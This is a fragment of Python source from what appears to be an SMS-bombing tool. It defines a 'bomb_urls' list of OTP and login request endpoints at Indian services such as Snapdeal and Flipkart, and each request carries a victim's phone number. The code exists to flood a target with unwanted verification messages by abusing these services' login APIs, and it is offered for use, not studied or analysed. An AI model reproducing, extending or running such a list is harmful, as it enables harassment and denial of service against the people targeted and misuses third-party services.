	...
	bomb_urls = [
		{
			...
			'json': {"operationName":"Login","variables":{"mobileNumber":"+91"+str(num),"loginType":"PATIENT","hashCode":"XZNKZ3TUKDO"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n"}
		},
		{
			'url': 'https://www.snapdeal.com/sendOTP?emailId=&mobileNumber='+str(num)+'&purpose=LOGIN_WITH_MOBILE_OTP',
		},
		{
		...
		{
			'url': 'https://www.flipkart.com/api/5/user/otp/generate?loginId=%2B91'+str(num),
			'headers': {
		...
		},
		{
			...
			'json': {"mobile":str(num),"clientSource":10,"brand_id":10,"dialing_code":"+91","country_code":"IND"}
		},
		{
